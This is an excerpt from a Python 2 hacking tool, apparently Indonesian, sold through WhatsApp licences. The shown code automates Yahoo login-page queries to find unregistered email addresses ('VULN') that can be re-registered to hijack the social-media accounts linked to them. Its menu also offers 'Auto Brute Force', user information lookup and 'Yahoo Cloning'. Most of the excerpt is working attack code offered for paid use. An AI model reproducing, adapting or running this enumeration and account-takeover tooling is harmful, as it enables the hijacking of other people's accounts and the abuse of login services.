        os.system('reset')
        print logo
        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile path \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_yahoo()

    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    save = open('out/FileMailVuln.txt', 'w')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail
                berhasil.append(mail)

    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/FileMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def beli_lisensi():
    os.system('reset')
    print '\n\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93m\x1b[1;96mBeli Lisensi\n\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n'
    print '\x1b[1;94m1.\x1b[1;91m Beli 15k versi \x1b[1;93m1.0.0'
    print '\x1b[1;94m2.\x1b[1;91m Beli 25k versi \x1b[1;93m2.0.0'
    print '\x1b[1;94m0.\x1b[1;91m Kembali'
    pil_beli()


def pil_beli():
    print ' '
    buy = raw_input('\x1b[1;97m\x1b[1;91m[\x1b[1;92m\xe2\x80\xa2\x1b[1;91m]\x1b[1;96m>>> \x1b[1;97m')
    if buy == '':
        print 'Lol'
        pil_beli()
    elif buy == '1':
        raw_input('Press Enter To WhatsApp....')
        os.system('xdg-open https://api.whatsapp.com/send?phone=6281360479719&text=Saya+Mau+Beli+Gan...')
    elif buy == '2':
        raw_input('Press Enter To WhatsApp....')
        os.system('xdg-open https://api.whatsapp.com/send?phone=6281360479719&text=Saya+Mau+Beli+Gan...')
    elif buy == '0':
        lisensu()


def freelisen():
    os.system('reset')
    print logo
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;96mYour Information'
    print '\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mNama   : \x1b[1;97m' + 'Anonim'
    print '\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mID     : \x1b[1;97m' + '100011112313'
    print '\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mStatus : \x1b[1;97mPercobaan'
    print '\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print '\x1b[1;97m' + '               ' + '\x1b[1;91m[\x1b[1;96mMENU\x1b[1;91m]'
    print ' '
    print '\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;91m[\x1b[1;92m1.\x1b[1;91m]\x1b[1;94m Get Information a User'
    print '\x1b[1;91m[\x1b[1;92m2.\x1b[1;91m]\x1b[1;94m Auto Brute Force'
    print '\x1b[1;91m[\x1b[1;92m3.\x1b[1;91m]\x1b[1;94m Profile Guard               '
    print '\x1b[1;91m[\x1b[1;92m4.\x1b[1;91m]\x1b[1;94m Yahoo Cloning       '
    print '\x1b[1;91m[\x1b[1;92m99\x1b[1;91m]\x1b[1;94m LogOut            '
    print '\x1b[1;91m[\x1b[1;97m00\x1b[1;91m]\x1b[1;98m Exit          '
    print '\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    free()


def free():
    print ' '
    puq = raw_input('\x1b[1;97m\x1b[1;91m[\x1b[1;92m\xe2\x80\xa2\x1b[1;91m]\x1b[1;96m>>> \x1b[1;97m')
    if puq == '':
        print 'Lol'
        free()
    elif puq == '1':
        print "Beli Lisensi nya gan :)\nCuma 15k Ga mahal kok :')"
        free()
    elif puq == '2':
        print "Beli Lisensi nya gan :)\nCuma 15k Ga mahal kok :')"
        free()
    elif puq == '3':
        print "Beli Lisensi nya gan :)\nCuma 15k Ga mahal kok :')"
        free()
    elif puq == '4':
        print "Beli Lisensi nya gan :)\nCuma 15k Ga mahal kok :')"
        free()
    elif puq == '99':
        keluar()
    elif puq == '00' or '0':
        keluar()
    else:
        print 'Lol'
        free()


lisensu()
